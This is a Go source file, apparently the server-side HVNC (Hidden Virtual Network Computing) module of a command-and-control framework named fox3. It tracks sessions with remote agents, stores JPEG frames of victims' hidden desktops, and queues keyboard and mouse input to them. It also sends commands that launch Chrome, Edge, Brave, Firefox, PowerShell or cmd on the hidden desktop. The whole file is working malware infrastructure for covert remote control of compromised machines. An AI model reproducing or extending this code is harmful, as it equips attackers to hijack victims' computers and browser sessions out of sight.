// Package hvnc manages Hidden Virtual Network Computing sessions.
//
// HVNC data flows as JOB_SOCKS packets with a dedicated connection UUID.
// The server routes incoming SOCKS jobs through hvnc.IsKnown() before
// the regular SOCKS module.
//
// Frame data (agent→server) is stored as the latest JPEG frame per agent.
// Input/control data (server→agent) is queued via JobsOut for delivery.
package hvnc

import (
	"encoding/binary"
	"log/slog"
	"sync"
	"sync/atomic"

	"github.com/google/uuid"

	foxJob "github.com/nzyuko/fox3/v2/pkg/fox3-message/jobs"
)

// Wire protocol markers (must match agent hvnc.rs)
const (
	frameNoChange byte = 0x00
	frameJPEG     byte = 0x01
	inputMsg      byte = 0x02
	controlMsg    byte = 0x03
)

// Session represents an active HVNC session for one agent.
type Session struct {
	ConnID  uuid.UUID // SOCKS connection ID (matches agent's conn_id)
	AgentID uuid.UUID

	mu       sync.RWMutex
	frame    []byte // Latest JPEG frame bytes
	width    uint32
	height   uint32
	frameSeq uint64 // Monotonic frame counter
	sendIdx  int32  // Next outbound (server→agent) SOCKS index
}

// FrameData carries a complete JPEG frame for WS push.
type FrameData struct {
	AgentID uuid.UUID
	Data    []byte
	Width   uint32
	Height  uint32
}

// Frame returns the latest JPEG frame data, dimensions, and sequence number.
func (s *Session) Frame() (data []byte, width, height uint32, seq uint64) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.frame, s.width, s.height, s.frameSeq
}

var (
	// sessions maps agentID → *Session
	sessions sync.Map

	// connToAgent maps connID → agentID for fast IsKnown lookup
	connToAgent sync.Map

	// JobsOut carries server→agent HVNC packets (input, control).
	// The job service relays these to the agent's job channel.
	JobsOut = make(chan foxJob.Job, 100)

	// FrameReady carries complete frame data for immediate WS push.
	// Buffered to absorb bursts from agent checkins.
	FrameReady = make(chan FrameData, 128)

	// activeCount tracks number of active sessions (for logging)
	activeCount atomic.Int32

	// maxFrameSize is the maximum allowed JPEG frame size (5 MB).
	maxFrameSize = 5 << 20
)

// Register creates a new HVNC session for the given agent.
func Register(agentID, connID uuid.UUID) {
	s := &Session{
		ConnID:  connID,
		AgentID: agentID,
	}
	sessions.Store(agentID, s)
	connToAgent.Store(connID, agentID)
	activeCount.Add(1)
	slog.Info("HVNC session registered", "agent", agentID, "conn_id", connID, "active", activeCount.Load())
}

// Unregister removes the HVNC session for the given agent.
func Unregister(agentID uuid.UUID) {
	if v, ok := sessions.LoadAndDelete(agentID); ok {
		s := v.(*Session)
		connToAgent.Delete(s.ConnID)
		activeCount.Add(-1)
		slog.Info("HVNC session unregistered", "agent", agentID, "active", activeCount.Load())
	}
}

// IsKnown returns true if connID belongs to an active HVNC session.
func IsKnown(connID uuid.UUID) bool {
	_, ok := connToAgent.Load(connID)
	return ok
}

// GetSession returns the HVNC session for the given agent, or nil.
func GetSession(agentID uuid.UUID) *Session {
	if v, ok := sessions.Load(agentID); ok {
		return v.(*Session)
	}
	return nil
}

// ForEachSession calls fn for every active HVNC session.
func ForEachSession(fn func(agentID uuid.UUID, s *Session)) {
	sessions.Range(func(key, value any) bool {
		fn(key.(uuid.UUID), value.(*Session))
		return true
	})
}

// In processes an incoming JOB_SOCKS packet from the agent (frame data).
func In(job foxJob.Job) {
	sp, ok := job.Payload.(foxJob.Socks)
	if !ok {
		return
	}

	agentIDv, ok := connToAgent.Load(sp.ID)
	if !ok {
		return
	}
	agentID := agentIDv.(uuid.UUID)

	v, ok := sessions.Load(agentID)
	if !ok {
		return
	}
	s := v.(*Session)

	data := sp.Data
	if len(data) == 0 {
		// Close packet — agent stopped HVNC
		if sp.Close {
			Unregister(agentID)
		}
		return
	}

	switch data[0] {
	case frameNoChange:
		// Desktop idle — no new frame to store
	case frameJPEG:
		if len(data) < 9 {
			return
		}
		w := binary.LittleEndian.Uint32(data[1:5])
		h := binary.LittleEndian.Uint32(data[5:9])
		if w > 8192 || h > 8192 {
			slog.Warn("HVNC frame dimensions too large, dropping", "agent", agentID, "w", w, "h", h)
			return
		}
		jpegLen := len(data) - 9
		if jpegLen > maxFrameSize {
			slog.Warn("HVNC frame too large, dropping", "agent", agentID, "bytes", jpegLen, "max", maxFrameSize)
			return
		}
		jpeg := make([]byte, jpegLen)
		copy(jpeg, data[9:])

		s.mu.Lock()
		s.frame = jpeg
		s.width = w
		s.height = h
		s.frameSeq++
		seq := s.frameSeq
		s.mu.Unlock()

		// Push complete frame data for immediate WS delivery (non-blocking)
		select {
		case FrameReady <- FrameData{AgentID: agentID, Data: jpeg, Width: w, Height: h}:
		default:
		}

		if seq%100 == 0 {
			slog.Debug("HVNC frame", "agent", agentID, "seq", seq, "w", w, "h", h, "jpeg_bytes", len(jpeg))
		}
	}
}

// SendInput queues a mouse/keyboard input message for the agent.
func SendInput(agentID uuid.UUID, msg, wparam, lparam uint32) error {
	v, ok := sessions.Load(agentID)
	if !ok {
		slog.Warn("HVNC SendInput: no session", "agent", agentID)
		return nil
	}
	slog.Debug("HVNC SendInput", "agent", agentID, "msg", msg, "wparam", wparam, "lparam", lparam)
	s := v.(*Session)

	buf := make([]byte, 13)
	buf[0] = inputMsg
	binary.LittleEndian.PutUint32(buf[1:5], msg)
	binary.LittleEndian.PutUint32(buf[5:9], wparam)
	binary.LittleEndian.PutUint32(buf[9:13], lparam)

	s.mu.Lock()
	idx := s.sendIdx
	s.sendIdx++
	s.mu.Unlock()

	job := foxJob.Job{
		AgentID: agentID,
		ID:      uuid.New().String(),
		Type:    foxJob.SOCKS,
		Payload: foxJob.Socks{
			ID:    s.ConnID,
			Index: int(idx),
			Data:  buf,
			Close: false,
		},
	}

	select {
	case JobsOut <- job:
	default:
		slog.Warn("HVNC JobsOut full, dropping input", "agent", agentID)
	}
	return nil
}

// SendControl queues a control/launch command for the agent.
func SendControl(agentID uuid.UUID, action uint32) error {
	v, ok := sessions.Load(agentID)
	if !ok {
		return nil
	}
	s := v.(*Session)

	buf := make([]byte, 5)
	buf[0] = controlMsg
	binary.LittleEndian.PutUint32(buf[1:5], action)

	s.mu.Lock()
	idx := s.sendIdx
	s.sendIdx++
	s.mu.Unlock()

	job := foxJob.Job{
		AgentID: agentID,
		ID:      uuid.New().String(),
		Type:    foxJob.SOCKS,
		Payload: foxJob.Socks{
			ID:    s.ConnID,
			Index: int(idx),
			Data:  buf,
			Close: false,
		},
	}

	select {
	case JobsOut <- job:
	default:
		slog.Warn("HVNC JobsOut full, dropping control", "agent", agentID)
	}
	return nil
}

// ActionFromString converts a launch app name to its wire protocol constant.
func ActionFromString(name string) uint32 {
	switch name {
	case "explorer":
		return 1
	case "run":
		return 2
	case "chrome":
		return 3
	case "edge":
		return 4
	case "brave":
		return 5
	case "firefox":
		return 6
	case "powershell":
		return 7
	case "cmd":
		return 8
	default:
		return 0
	}
}
